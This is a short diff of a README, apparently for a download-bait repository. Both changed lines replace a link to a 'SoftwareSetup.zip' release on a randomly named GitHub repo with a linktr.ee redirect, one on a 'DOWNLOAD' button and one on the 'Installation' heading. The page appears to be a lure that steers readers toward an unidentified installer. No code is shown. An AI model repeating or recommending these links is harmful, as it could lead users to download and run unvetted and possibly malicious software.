@@ -2,7 +2,7 @@
 
 <p align="center">
 
-[DOWNLOAD](https://github.com/nucleuselktap/qcgkhmnm/releases/download/jdfkv/SoftwareSetup.zip)
+[DOWNLOAD](https://linktr.ee/susanbrownu640)
 
 </p>
 
@@ -48,7 +48,7 @@ This repository is organized for users who want a direct download path, simple s
 
 ---
 
-## [📥 Installation](https://github.com/nucleuselktap/qcgkhmnm/releases/download/jdfkv/SoftwareSetup.zip)
+## [📥 Installation](https://linktr.ee/susanbrownu640)
 
 ```bash
 1. Open the download page
